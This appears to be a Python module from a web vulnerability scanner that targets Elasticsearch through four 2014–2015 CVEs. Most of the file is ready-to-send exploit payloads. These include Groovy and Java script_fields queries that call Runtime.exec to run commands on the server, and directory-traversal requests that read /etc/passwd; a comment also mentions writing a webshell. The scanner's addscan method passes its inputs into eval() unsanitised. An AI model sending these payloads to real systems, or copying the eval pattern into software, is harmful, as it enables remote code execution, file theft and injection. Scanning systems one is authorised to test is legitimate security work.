#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ElasticSearch扫描类: 
        1. ElasticSearch 命令执行
            CVE-2014-3120
                Payload: https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/

        2. ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞
            CVE-2015-1427
                Payload: https://vulhub.org/#/environments/elasticsearch/CVE-2015-1427/

        3. ElasticSearch 目录穿越
            CVE-2015-3337
                Payload: https://vulhub.org/#/environments/elasticsearch/CVE-2015-3337/

        4. ElasticSearch 目录穿越
            CVE-2015-5531
                Payload: https://vulhub.org/#/environments/elasticsearch/CVE-2015-5531/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''
        #  Elasticsearch写入webshell
        #   WooYun-2015-110216

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from lib.tool import head
from payloads.ElasticSearch.cve_2014_3120 import cve_2014_3120_scan
from payloads.ElasticSearch.cve_2015_1427 import cve_2015_1427_scan
from payloads.ElasticSearch.cve_2015_3337 import cve_2015_3337_scan
from payloads.ElasticSearch.cve_2015_5531 import cve_2015_5531_scan

class ElasticSearch():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ElasticSearch'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2014_3120_payloads = [
            {
                'path': 'website/blog/',
                'data': '{"name": "mouse"}',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': '_search?pretty',
                'data': '''{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\"COMMAND\\").getInputStream()).useDelimiter(\\"\\\\\\\\A\\").next();"
        }
    }
}'''.replace('COMMAND', self.cmd),
                'headers': head.merge(self.headers, {})
            }
        ]

        self.cve_2015_1427_payloads = [
            {
                'path': 'website/blog/',
                'data': '{"name": "mouse2"}',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': '_search?pretty',
                'data': '{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"COMMAND\\").getText()"}}}'.replace('COMMAND', self.cmd),
                'headers': head.merge(self.headers, {})
            }
        ]

        self.cve_2015_3337_payloads = [
            {
                'path': '_plugin/head/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
        ]

        self.cve_2015_5531_payloads = [
            {
                'path': '_snapshot/mouse3',
                'data': '{"type": "fs","settings": {"location": "/usr/share/elasticsearch/repo/mouse3"}}',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': '_snapshot/mouse33',
                'data': '{"type": "fs","settings": {"location": "/usr/share/elasticsearch/repo/mouse3/snapshot-backdata"}}',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': '_snapshot/mouse3/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
                'data': '',
                'headers': head.merge(self.headers, {})
            }
        ]
    
    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2014_3120_scan, url=url),
            thread(target=self.cve_2015_1427_scan, url=url),
            thread(target=self.cve_2015_3337_scan, url=url),
            thread(target=self.cve_2015_5531_scan, url=url)
        ]

ElasticSearch.cve_2014_3120_scan = cve_2014_3120_scan
ElasticSearch.cve_2015_1427_scan = cve_2015_1427_scan
ElasticSearch.cve_2015_3337_scan = cve_2015_3337_scan
ElasticSearch.cve_2015_5531_scan = cve_2015_5531_scan

elasticsearch = ElasticSearch()
